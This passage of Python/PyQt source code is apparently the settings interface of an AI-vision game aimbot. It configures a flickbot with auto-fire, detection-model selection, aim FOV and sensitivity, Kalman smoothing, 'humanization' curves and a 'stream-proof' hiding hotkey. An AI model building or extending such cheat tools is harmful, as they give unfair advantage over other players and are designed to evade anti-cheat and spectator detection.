            flickbot_config.get('auto_fire', True)
        )
        flick_layout.addWidget(self.flickbot_autofire_cb)
    
        self.flickbot_return_cb = self.create_modern_checkbox(
            "Return to original position",
            flickbot_config.get('return_to_origin', True)
        )
        flick_layout.addWidget(self.flickbot_return_cb)
    
        layout.addWidget(flick_container)
    
        # Info box
        info_box = QWidget()
        info_box.setStyleSheet("""
            QWidget {
                background-color: #1e1e1e;
                border: 1px solid #e91e63;
                border-radius: 4px;
                padding: 12px;
            }
        """)
        info_layout = QVBoxLayout(info_box)
    
        info_text = QLabel("Flickbot performs instant flick shots to targets. "
                        "Hold the activation key and it will quickly flick to the nearest target.")
        info_text.setStyleSheet("""
            color: #e91e63;
            font-size: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        info_text.setWordWrap(True)
        info_layout.addWidget(info_text)
    
        layout.addWidget(info_box)
        layout.addStretch()

    def create_models_content(self, layout):
        """Create models tab content"""
        layout.addWidget(self.create_section_title("Models"))
        layout.addWidget(self.create_section_description("Manage and configure AI models"))

        # Model Selection Group
        model_group = self.create_settings_group()
        model_container = QWidget()
        model_layout = QVBoxLayout(model_container)
        model_layout.setContentsMargins(0, 0, 0, 0)
        model_layout.setSpacing(12)
        
        model_layout.addWidget(self.create_group_label("Model Selection"))
        
        # Model dropdown with buttons
        model_select_layout = QHBoxLayout()
        model_select_layout.setSpacing(8)
        
        self.model_combo = QComboBox()
        self.model_combo.setMinimumWidth(300)
        self.model_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.model_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
        model_select_layout.addWidget(self.model_combo)
        
        # Buttons
        self.refresh_models_btn = self.create_small_button("Refresh", "#3e3e3e")
        self.refresh_models_btn.clicked.connect(self.refresh_models)
        model_select_layout.addWidget(self.refresh_models_btn)
        
        self.browse_model_btn = self.create_small_button("Browse...", "#3e3e3e")
        self.browse_model_btn.clicked.connect(self.browse_for_model)
        model_select_layout.addWidget(self.browse_model_btn)
        
        self.apply_model_btn = self.create_small_button("Apply", "#007acc")
        self.apply_model_btn.clicked.connect(self.apply_model_change)
        model_select_layout.addWidget(self.apply_model_btn)
        
        model_layout.addLayout(model_select_layout)
        
        # Model settings checkboxes
        self.auto_detect_model_cb = self.create_modern_checkbox(
            "Auto-detect best model", 
            self.config_manager.get_value("model.auto_detect", True)
        )
        self.auto_detect_model_cb.stateChanged.connect(self.on_auto_detect_changed)
        model_layout.addWidget(self.auto_detect_model_cb)
        
        self.tensorrt_preference_cb = self.create_modern_checkbox(
            "Prefer TensorRT models (.engine)", 
            self.config_manager.get_value("model.use_tensorrt", True)
        )
        self.tensorrt_preference_cb.stateChanged.connect(self.on_tensorrt_changed)
        model_layout.addWidget(self.tensorrt_preference_cb)
        
        layout.addWidget(model_container)

        # Model Information Group
        info_group = self.create_settings_group()
        info_container = QWidget()
        info_layout = QVBoxLayout(info_container)
        info_layout.setContentsMargins(0, 0, 0, 0)
        info_layout.setSpacing(12)
        
        info_layout.addWidget(self.create_group_label("Current Model Information"))
        
        # Model info display
        self.model_info_widget = QWidget()
        self.model_info_widget.setStyleSheet("""
            QWidget {
                background-color: #1e1e1e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 12px;
            }
        """)
        info_grid = QHBoxLayout(self.model_info_widget)
        info_grid.setSpacing(24)
        
        # Create info labels
        self.model_path_label = self.create_info_label("Path", "Not loaded")
        self.model_type_label = self.create_info_label("Type", "N/A")
        self.model_size_label = self.create_info_label("Size", "N/A")
        self.model_priority_label = self.create_info_label("Priority", "N/A")
        
        info_grid.addWidget(self.model_path_label)
        info_grid.addWidget(self.model_type_label)
        info_grid.addWidget(self.model_size_label)
        info_grid.addWidget(self.model_priority_label)
        info_grid.addStretch()
        
        info_layout.addWidget(self.model_info_widget)
        layout.addWidget(info_container)

        # Model Overrides Group
        overrides_group = self.create_settings_group()
        overrides_container = QWidget()
        overrides_layout = QVBoxLayout(overrides_container)
        overrides_layout.setContentsMargins(0, 0, 0, 0)
        overrides_layout.setSpacing(16)
        
        overrides_layout.addWidget(self.create_group_label("Model-Specific Overrides"))
        
        # Confidence override
        conf_layout = QHBoxLayout()
        self.conf_override_cb = self.create_modern_checkbox("Override Confidence")
        conf_layout.addWidget(self.conf_override_cb)
        
        self.conf_override_slider = self.create_modern_slider(
            conf_layout, 
            "", 
            30, 
            10, 
            90, 
            "%"
        )
        self.conf_override_slider.setEnabled(False)
        
        self.conf_override_cb.stateChanged.connect(self.on_conf_override_changed)
        overrides_layout.addLayout(conf_layout)
        
        # IOU override
        iou_layout = QHBoxLayout()
        self.iou_override_cb = self.create_modern_checkbox("Override IOU")
        iou_layout.addWidget(self.iou_override_cb)
        
        self.iou_override_slider = self.create_modern_slider(
            iou_layout, 
            "", 
            10, 
            10, 
            90, 
            "%"
        )
        self.iou_override_slider.setEnabled(False)
        
        self.iou_override_cb.stateChanged.connect(self.on_iou_override_changed)
        overrides_layout.addLayout(iou_layout)
        
        layout.addWidget(overrides_container)
        
        self.models_table = QTableWidget()
        self.models_table.setColumnCount(4)
        self.models_table.setHorizontalHeaderLabels(["Name", "Type", "Size (MB)", "Priority"])
        self.models_table.horizontalHeader().setStretchLastSection(True)
        self.models_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.models_table.itemSelectionChanged.connect(self.on_model_table_selected)
        self.models_table.setMaximumHeight(200)
        self.models_table.setStyleSheet("""
            QTableWidget {
                background-color: #1e1e1e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                gridline-color: #3e3e3e;
            }
            QTableWidget::item {
                padding: 8px;
                color: #cccccc;
            }
            QTableWidget::item:selected {
                background-color: #007acc;
            }
            QHeaderView::section {
                background-color: #2d2d2d;
                color: #cccccc;
                padding: 8px;
                border: none;
                border-right: 1px solid #3e3e3e;
                border-bottom: 1px solid #3e3e3e;
            }
        """)

        layout.addStretch()
        
        # Initialize model list
        self.refresh_models()

    def create_small_button(self, text, bg_color):
        """Create small action button"""
        btn = QPushButton(text)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {bg_color};
                border: none;
                color: white;
                padding: 6px 12px;
                border-radius: 4px;
                font-size: 12px;
                font-weight: 500;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }}
            QPushButton:hover {{
                background-color: #555;
            }}
            QPushButton:pressed {{
                background-color: #333;
            }}
        """)
        return btn
    
    def create_info_label(self, title, value):
        """Create information label widget"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(4)
        
        title_label = QLabel(title)
        title_label.setStyleSheet("""
            color: #858585;
            font-size: 11px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        layout.addWidget(title_label)
        
        value_label = QLabel(value)
        value_label.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        value_label.setWordWrap(True)
        layout.addWidget(value_label)
        
        # Store value label for updates
        widget.value_label = value_label
        
        return widget
    
    def start_hotkey_listener(self):
        """Start a thread to listen for hotkeys"""
        def hotkey_loop():
            last_menu_key_state = False
            last_stream_key_state = False
            
            while True:
                try:
                    # Get current hotkey from config
                    current_config = self.config_manager.get_config()
                    hotkey_config = current_config.get("hotkeys", {})
                    
                    # Parse keys
                    menu_key_str = hotkey_config.get("menu_toggle_key", "0x76")
                    stream_key_str = hotkey_config.get("stream_proof_key", "0x75")
                    
                    try:
                        menu_key = int(menu_key_str, 16) if isinstance(menu_key_str, str) else menu_key_str
                        stream_key = int(stream_key_str, 16) if isinstance(stream_key_str, str) else stream_key_str
                    except:
                        menu_key = 0x76  # F7
                        stream_key = 0x75  # F6
                    
                    # Check menu toggle key with proper state tracking
                    menu_key_state = win32api.GetAsyncKeyState(menu_key) & 0x8000
                    if menu_key_state and not last_menu_key_state:
                        QTimer.singleShot(0, self.toggle_visibility)
                        time.sleep(0.2)  # Debounce
                    last_menu_key_state = menu_key_state
                    
                    # Check stream-proof key with proper state tracking
                    stream_key_state = win32api.GetAsyncKeyState(stream_key) & 0x8000
                    if stream_key_state and not last_stream_key_state:
                        QTimer.singleShot(0, self.toggle_stream_proof)
                        time.sleep(0.2)  # Debounce
                    last_stream_key_state = stream_key_state
                    
                    time.sleep(0.05)  # Check every 50ms
                except Exception as e:
                    print(f"Hotkey error: {e}")
                    time.sleep(1)
        
        import threading
        hotkey_thread = threading.Thread(target=hotkey_loop, daemon=True)
        hotkey_thread.start()
        self.hotkey_thread = hotkey_thread

    def toggle_stream_proof(self):
        """Toggle stream-proof mode"""
        #print("[DEBUG] toggle_stream_proof called")
        
        try:
            # Toggle the stream-proof state
            is_enabled = self.stream_proof.toggle()
            self.stream_proof_enabled = is_enabled
            
            # Update status label
            self.update_stream_proof_status(is_enabled)
            
            # Show notification
            self.status_label.setText(f"Stream-proof {'enabled' if is_enabled else 'disabled'}")
            self.status_dot.setStyleSheet(f"color: {'#4caf50' if is_enabled else '#858585'}; font-size: 10px;")
            
            # Reset status after delay
            QTimer.singleShot(2000, self.reset_status_label)
            
        except Exception as e:
            print(f"[-] Error in toggle_stream_proof: {e}")
            import traceback
            traceback.print_exc()
            
            # Show error in UI
            self.status_label.setText("Stream-proof error")
            self.status_dot.setStyleSheet("color: #f44336; font-size: 10px;")
            QTimer.singleShot(2000, self.reset_status_label)

    def update_stream_proof_status(self, is_enabled):
        """Update the stream-proof status label"""
        if hasattr(self, 'stream_proof_status'):
            status_text = "Stream-Proof: Enabled" if is_enabled else "Stream-Proof: Disabled"
            self.stream_proof_status.setText(status_text)
            
            # Change color based on status
            if is_enabled:
                self.stream_proof_status.setStyleSheet("""
                    color: #4caf50;
                    font-size: 13px;
                    padding: 8px;
                    background-color: #1e1e1e;
                    border: 1px solid #4caf50;
                    border-radius: 4px;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                """)
            else:
                self.stream_proof_status.setStyleSheet("""
                    color: #cccccc;
                    font-size: 13px;
                    padding: 8px;
                    background-color: #1e1e1e;
                    border: 1px solid #3e3e3e;
                    border-radius: 4px;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                """)

    def reset_status_label(self):
        """Reset the status label to default"""
        if self.aimbot_controller.running:
            self.status_label.setText("Running")
        else:
            self.status_label.setText("Ready")

    def toggle_visibility(self):
        """Toggle window visibility"""
        if self.is_hidden:
            self.show()
            self.raise_()
            self.activateWindow()
            self.is_hidden = False
            #rint("[+] Menu shown")
        else:
            self.hide()
            self.is_hidden = True
            #print("[+] Menu hidden")

    def closeEvent(self, event):
        """Override close event to hide instead of close when using X button"""
        if self.aimbot_controller.running:
            # Just hide the window instead of closing
            self.hide()
            self.is_hidden = True
            event.ignore()
        else:
            # Actually close if aimbot is not running
            event.accept()
    
    def refresh_models(self):
        """Refresh the list of available models"""
        models = self.config_manager.get_available_models()
        current_model = self.config_manager.get_selected_model()
        
        # Update combo box
        self.model_combo.clear()
        self.model_combo.addItem("Auto-detect", "auto")
        
        for model in models:
            self.model_combo.addItem(model["name"], model["path"])
        
        # Select current model
        index = self.model_combo.findData(current_model)
        if index >= 0:
            self.model_combo.setCurrentIndex(index)
        
        # Update models table
        self.models_table.setRowCount(len(models))
        for i, model in enumerate(models):
            self.models_table.setItem(i, 0, QTableWidgetItem(model["name"]))
            self.models_table.setItem(i, 1, QTableWidgetItem(model["type"]))
            self.models_table.setItem(i, 2, QTableWidgetItem(f"{model['size']:.1f}"))
            self.models_table.setItem(i, 3, QTableWidgetItem(str(model["priority"])))
        
        # Update model info
        self.update_model_info()

    def update_model_info(self):
        """Update the model information display"""
        current_path = self.model_combo.currentData()
        
        if current_path and current_path != "auto":
            # Find model info
            models = self.config_manager.get_available_models()
            model_info = next((m for m in models if m["path"] == current_path), None)
            
            if model_info:
                self.model_path_label.value_label.setText(model_info["path"])
                self.model_type_label.value_label.setText(model_info["type"])
                self.model_size_label.value_label.setText(f"{model_info['size']:.1f} MB")
                self.model_priority_label.value_label.setText(str(model_info["priority"]))
            else:
                self.clear_model_info()
        else:
            # Auto mode - show best model
            best_model = self.config_manager.get_best_available_model()
            if best_model:
                models = self.config_manager.get_available_models()
                model_info = next((m for m in models if m["path"] == best_model), None)
                if model_info:
                    self.model_path_label.value_label.setText(f"Auto: {model_info['name']}")
                    self.model_type_label.value_label.setText(model_info["type"])
                    self.model_size_label.value_label.setText(f"{model_info['size']:.1f} MB")
                    self.model_priority_label.value_label.setText(str(model_info["priority"]))
            else:
                self.clear_model_info()

    def clear_model_info(self):
        """Clear model information display"""
        self.model_path_label.value_label.setText("Not loaded")
        self.model_type_label.value_label.setText("N/A")
        self.model_size_label.value_label.setText("N/A")
        self.model_priority_label.value_label.setText("N/A")

    def browse_for_model(self):
        """Browse for a model file"""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select Model File",
            "",
            "Model Files (*.engine *.pt *.onnx);;All Files (*.*)"
        )
        
        if file_path:
            # Add to combo box if not already there
            index = self.model_combo.findData(file_path)
            if index < 0:
                model_name = os.path.basename(file_path)
                self.model_combo.addItem(model_name, file_path)
                index = self.model_combo.count() - 1
            
            self.model_combo.setCurrentIndex(index)
            self.update_model_info()

    def apply_model_change(self):
        """Apply the selected model change"""
        selected_model = self.model_combo.currentData()
    
        if selected_model:
            # Update config first
            success = self.config_manager.set_selected_model(selected_model)
        
            if success:
                # Start model reload in background
                self.status_label.setText("Reloading model...")
                self.status_dot.setStyleSheet("color: #ff9800; font-size: 10px;")
            
                # Disable the apply button during reload
                self.apply_model_btn.setEnabled(False)
            
                self.model_reload_thread = ModelReloadThread(self.aimbot_controller)
                self.model_reload_thread.finished.connect(self.on_model_reload_finished)
                self.model_reload_thread.progress.connect(
                    lambda msg: self.status_label.setText(msg)
                )
                self.model_reload_thread.start()
            else:
                QMessageBox.warning(
                    self,
                    "Error",
                    "Failed to change model. Please check if the file exists."
                )

    def on_model_reload_finished(self, success, message):
        """Handle model reload completion"""
        # Re-enable the apply button
        self.apply_model_btn.setEnabled(True)
    
        if success:
            self.status_label.setText("Model loaded")
            self.status_dot.setStyleSheet("color: #4caf50; font-size: 10px;")
            QTimer.singleShot(2000, lambda: self.status_label.setText("Ready"))
        
            # Update model info display
            self.update_model_info()
        
            # Show success notification
            QMessageBox.information(
                self,
                "Success",
                message
            )
        else:
            self.status_label.setText("Error")
            self.status_dot.setStyleSheet("color: #f44336; font-size: 10px;")
            QMessageBox.critical(self, "Model Reload Error", message)

    def on_model_table_selected(self):
        """Handle model selection in the table"""
        selected_items = self.models_table.selectedItems()
        if selected_items:
            row = selected_items[0].row()
            model_name = self.models_table.item(row, 0).text()
            
            # Find and select in combo box
            for i in range(self.model_combo.count()):
                if self.model_combo.itemText(i) == model_name:
                    self.model_combo.setCurrentIndex(i)
                    break

    def on_auto_detect_changed(self, state):
        """Handle auto-detect checkbox change"""
        enabled = state == Qt.CheckState.Checked.value
        self.config_manager.set_value("model.auto_detect", enabled)
        
        if enabled:
            self.model_combo.setCurrentIndex(0)  # Select "Auto-detect"

    def on_tensorrt_changed(self, state):
        """Handle TensorRT preference change"""
        enabled = state == Qt.CheckState.Checked.value
        self.config_manager.set_value("model.use_tensorrt", enabled)
        self.refresh_models()

    def on_conf_override_changed(self, state):
        """Handle confidence override checkbox change"""
        enabled = state == Qt.CheckState.Checked.value
        self.conf_override_slider.setEnabled(enabled)
        
        if enabled:
            value = self.conf_override_slider.value() / 100.0
            self.config_manager.set_model_overrides(confidence=value)
        else:
            self.config_manager.set_model_overrides(confidence=None)

    def on_iou_override_changed(self, state):
        """Handle IOU override checkbox change"""
        enabled = state == Qt.CheckState.Checked.value
        self.iou_override_slider.setEnabled(enabled)
        
        if enabled:
            value = self.iou_override_slider.value() / 100.0
            self.config_manager.set_model_overrides(iou=value)
        else:
            self.config_manager.set_model_overrides(iou=None)

    def create_section_widget(self):
        """Create a styled section widget"""
        widget = QWidget()
        widget.setStyleSheet("background-color: transparent;")
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(24)
        return widget

    def create_section_title(self, text):
        """Create section title with consistent styling"""
        title = QLabel(text)
        title.setStyleSheet("""
            color: #e7e7e7;
            font-size: 24px;
            font-weight: 300;
            margin-bottom: 8px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        return title

    def create_section_description(self, text):
        """Create section description"""
        desc = QLabel(text)
        desc.setWordWrap(True)
        desc.setStyleSheet("""
            color: #858585;
            font-size: 13px;
            line-height: 1.5;
            margin-bottom: 16px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        return desc

    def create_general_content(self, layout):
        """General settings tab"""
        layout.addWidget(self.create_section_title("General"))

        # Main settings group
        settings_group = self.create_settings_group()
        settings_container = QWidget()
        settings_layout = QVBoxLayout(settings_container)
        settings_layout.setContentsMargins(0, 0, 0, 0)
        settings_layout.setSpacing(20)
        
        fov_label = QLabel("Field of View")
        fov_label.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        settings_layout.addWidget(fov_label)
    
        self.fov_combo = NoScrollComboBox()
        self.fov_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.fov_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
    
        # Add FOV options
        fov_values = [120, 160, 180, 240, 320, 360, 480, 640]
        for value in fov_values:
            self.fov_combo.addItem(f"{value}px", value)
    
        # Set current FOV value
        current_fov = self.config_data.get("fov", 320)
        index = self.fov_combo.findData(current_fov)
        if index >= 0:
            self.fov_combo.setCurrentIndex(index)
        else:
            # If current value not in list, find closest
            closest_index = min(range(len(fov_values)), key=lambda i: abs(fov_values[i] - current_fov))
            self.fov_combo.setCurrentIndex(closest_index)
    
        settings_layout.addWidget(self.fov_combo)

        self.sens_slider = self.create_modern_slider(settings_layout, "Sensitivity (Higher is Faster)", int(self.config_data["sensitivity"] * 10), 1, 100, "", 0.1)
        self.aim_height_slider = self.create_modern_slider(settings_layout, "Aim Height Offset", self.config_data["aim_height"], 1, 100, "%")
        self.confidence_slider = self.create_modern_slider(settings_layout, "Ai Confidence", int(self.config_data["confidence"] * 100), 10, 99, "%", 0.01)
        
        layout.addWidget(settings_container)

        # Mouse FOV Settings (NEW)
        mouse_fov_group = self.create_settings_group()
        mouse_fov_container = QWidget()
        mouse_fov_layout = QVBoxLayout(mouse_fov_container)
        mouse_fov_layout.setContentsMargins(0, 0, 0, 0)
        mouse_fov_layout.setSpacing(16)
    
        # Enable separate FOV checkbox
        mouse_fov_config = self.config_data.get('mouse_fov', {
            'mouse_fov_width': 40,
            'mouse_fov_height': 40,
            'use_separate_fov': False
        })
    
        self.use_separate_fov_checkbox = self.create_modern_checkbox(
        "Use Separate X/Y FOV", 
            mouse_fov_config.get('use_separate_fov', False)
        )
        mouse_fov_layout.addWidget(self.use_separate_fov_checkbox)
    
        # Mouse FOV Width slider
        self.mouse_fov_width_slider = self.create_modern_slider(
            mouse_fov_layout, 
            "Mouse FOV Width (Horizontal)", 
            mouse_fov_config.get('mouse_fov_width', 40), 
            10, 
            180, 
            "°"
        )
    
        # Mouse FOV Height slider
        self.mouse_fov_height_slider = self.create_modern_slider(
            mouse_fov_layout, 
            "Mouse FOV Height (Vertical)", 
            mouse_fov_config.get('mouse_fov_height', 40), 
            10, 
            180, 
            "°"
        )
    
        # DPI Settings
        self.dpi_slider = self.create_modern_slider(
            mouse_fov_layout,
            "Mouse DPI",
            self.config_data.get('dpi', 800),
            400,
            3200,
            " DPI"
        )
    
        layout.addWidget(mouse_fov_container)

        # Keybind section
        keybind_section = self.create_settings_group()
        self.create_keybind_selector(keybind_section)
        layout.addLayout(keybind_section)

        layout.addStretch()

    def create_display_content(self, layout):
        """Display settings tab"""
        layout.addWidget(self.create_section_title("Display"))
        layout.addWidget(self.create_section_description("Customize overlay appearance and behavior"))

        # Overlay settings group
        overlay_group = self.create_settings_group()
        overlay_container = QWidget()
        overlay_layout = QVBoxLayout(overlay_container)
        overlay_layout.setContentsMargins(0, 0, 0, 0)
        overlay_layout.setSpacing(12)
        
        self.show_overlay_checkbox = self.create_modern_checkbox("Enable Overlay", self.config_data.get("show_overlay", True))
        overlay_layout.addWidget(self.show_overlay_checkbox)
        
        self.overlay_show_borders_checkbox = self.create_modern_checkbox("Show Overlay Borders", self.config_data.get("overlay_show_borders", True))
        overlay_layout.addWidget(self.overlay_show_borders_checkbox)
        
        self.circle_capture_checkbox = self.create_modern_checkbox("Circular Capture Region", self.config_data.get("circle_capture", True))
        overlay_layout.addWidget(self.circle_capture_checkbox)
        
        layout.addWidget(overlay_container)

        # Shape selector section
        shape_section = self.create_settings_group()
        self.create_shape_selector(shape_section)
        layout.addLayout(shape_section)

        # Debug settings group
        debug_group = self.create_settings_group()
        debug_container = QWidget()
        debug_layout = QVBoxLayout(debug_container)
        debug_layout.setContentsMargins(0, 0, 0, 0)
        debug_layout.setSpacing(12)
        
        debug_layout.addWidget(self.create_group_label("Debug Options"))
        
        self.show_debug_window_checkbox = self.create_modern_checkbox("Show Debug Window (320x320)", self.config_data.get("show_debug_window", False))
        debug_layout.addWidget(self.show_debug_window_checkbox)
        
        debug_desc = QLabel("Small window showing real-time FPS and CUDA GPU acceleration status")
        debug_desc.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 26px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        debug_desc.setWordWrap(True)
        debug_layout.addWidget(debug_desc)
        
        layout.addWidget(debug_container)

        # Resolution settings group
        res_group = self.create_settings_group()
        res_container = QWidget()
        res_layout = QVBoxLayout(res_container)
        res_layout.setContentsMargins(0, 0, 0, 0)
        res_layout.setSpacing(12)
        
        res_layout.addWidget(self.create_group_label("Resolution"))
        
        self.custom_res_checkbox = self.create_modern_checkbox("Use Custom Resolution", self.config_data["custom_resolution"]["use_custom_resolution"])
        res_layout.addWidget(self.custom_res_checkbox)
        
        res_inputs = QWidget()
        res_inputs_layout = QHBoxLayout(res_inputs)
        res_inputs_layout.setContentsMargins(0, 8, 0, 0)
        res_inputs_layout.setSpacing(12)
        
        self.res_x_entry = self.create_modern_input("Width", str(self.config_data["custom_resolution"]["x"]))
        self.res_y_entry = self.create_modern_input("Height", str(self.config_data["custom_resolution"]["y"]))
        
        res_inputs_layout.addWidget(self.res_x_entry)
        res_inputs_layout.addWidget(self.res_y_entry)
        res_inputs_layout.addStretch()
        
        res_layout.addWidget(res_inputs)
        layout.addWidget(res_container)

        layout.addStretch()

    def create_performance_content(self, layout):
        """Performance settings tab"""
        layout.addWidget(self.create_section_title("Performance"))
        layout.addWidget(self.create_section_description("Fine-tune smoothing and prediction algorithms"))

        # Kalman filter settings
        kalman_config = self.config_data.get("kalman", {
            "use_kalman": True,
            "kf_p": 38.17,
            "kf_r": 2.8,
            "kf_q": 28.11,
            "kalman_frames_to_predict": 1.5,
            "alpha_with_kalman": 1.5
        })
        
        kalman_group = self.create_settings_group()
        kalman_container = QWidget()
        kalman_layout = QVBoxLayout(kalman_container)
        kalman_layout.setContentsMargins(0, 0, 0, 0)
        kalman_layout.setSpacing(20)
        
        kalman_layout.addWidget(self.create_group_label("Smoothing Filter"))
        
        self.use_kalman_checkbox = self.create_modern_checkbox("Enable Smoothing", kalman_config.get("use_kalman", True))
        kalman_layout.addWidget(self.use_kalman_checkbox)

        # Add this after the "Enable Smoothing" checkbox
        self.use_coupled_checkbox = self.create_modern_checkbox(
            "Use Coupled XY Tracking", 
            kalman_config.get("use_coupled_xy", False)
        )
        kalman_layout.addWidget(self.use_coupled_checkbox)
        
        # Add some spacing before sliders
        spacer = QWidget()
        spacer.setFixedHeight(12)
        kalman_layout.addWidget(spacer)

        # Alpha smoothing when Kalman is enabled
        alpha_with_kalman = int(kalman_config.get("alpha_with_kalman", 1.5) * 100)
        self.alpha_with_kalman_slider = self.create_modern_slider(
            kalman_layout, 
            "Alpha Smoothing", 
            alpha_with_kalman, 
            100, 
            300, 
            "", 
            0.01
        )
        
        self.kf_p_slider = self.create_modern_slider(kalman_layout, "Kf (P) - Trust in measurements", int(kalman_config.get("kf_p", 38.17) * 100), 100, 10000, "", 0.01)
        self.kf_r_slider = self.create_modern_slider(kalman_layout, "Kf (R) - Direct movement", int(kalman_config.get("kf_r", 2.8) * 100), 10, 1000, "", 0.01)
        self.kf_q_slider = self.create_modern_slider(kalman_layout, "Kf (Q) - Quick movement tracking", int(kalman_config.get("kf_q", 28.11) * 100), 100, 5000, "", 0.01)
        self.kalman_frames_slider = self.create_modern_slider(kalman_layout, "Prediction Frames (F) - Response time", int(kalman_config.get("kalman_frames_to_predict", 1.5) * 10), 1, 50, "", 0.1)
        
        layout.addWidget(kalman_container)

        layout.addStretch()

    def create_advanced_content(self, layout):
        """Advanced settings tab with fast movement curves"""
        layout.addWidget(self.create_section_title("Advanced"))
        layout.addWidget(self.create_section_description("Movement curves and humanization settings"))

        movement_config = self.config_data.get("movement", {
            "use_curves": False,
            "curve_type": "Exponential",  # Default to fastest
            "movement_speed": 3.0,  # Higher default speed
            "smoothing_enabled": True,
            "smoothing_factor": 0.1,  # Lower for faster response
            "random_curves": False
        })

        # Humanizer section
        humanizer_group = self.create_settings_group()
        humanizer_container = QWidget()
        humanizer_layout = QVBoxLayout(humanizer_container)
        humanizer_layout.setContentsMargins(0, 0, 0, 0)
        humanizer_layout.setSpacing(20)
        
        humanizer_layout.addWidget(self.create_group_label("Movement Curves"))
        
        self.enable_movement_curves_checkbox = self.create_modern_checkbox("Enable Movement Curves", movement_config.get("use_curves", False))
        humanizer_layout.addWidget(self.enable_movement_curves_checkbox)
        
        # Add description
        curves_desc = QLabel("Adds subtle natural movement while maintaining aimlock speed")
        curves_desc.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 26px;
            margin-bottom: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        curves_desc.setWordWrap(True)
        humanizer_layout.addWidget(curves_desc)
        
        # Humanization slider (lower values for faster curves)
        smoothing_factor = movement_config.get("smoothing_factor", 0.1)
        humanizer_value = int(smoothing_factor * 100)
        self.humanizer_slider = self.create_modern_slider(humanizer_layout, "Humanization Level (Lower = Faster)", humanizer_value, 0, 100, "%")
        
        layout.addWidget(humanizer_container)

        # Speed Preset Buttons
        preset_group = self.create_settings_group()
        preset_container = QWidget()
        preset_layout = QVBoxLayout(preset_container)
        preset_layout.setContentsMargins(0, 0, 0, 0)
        preset_layout.setSpacing(12)
        
        preset_layout.addWidget(self.create_group_label("Speed Presets"))
        
        # Preset buttons layout
        preset_buttons_layout = QHBoxLayout()
        preset_buttons_layout.setSpacing(8)
        
        # Create preset buttons
        self.aimlock_btn = self.create_preset_button("Aimlock", "#e91e63")
        self.aimlock_btn.clicked.connect(lambda: self.apply_curve_preset('aimlock'))
        preset_buttons_layout.addWidget(self.aimlock_btn)
        
        self.fast_btn = self.create_preset_button("Fast", "#ff9800")
        self.fast_btn.clicked.connect(lambda: self.apply_curve_preset('fast'))
        preset_buttons_layout.addWidget(self.fast_btn)
        
        self.medium_btn = self.create_preset_button("Medium", "#4caf50")
        self.medium_btn.clicked.connect(lambda: self.apply_curve_preset('medium'))
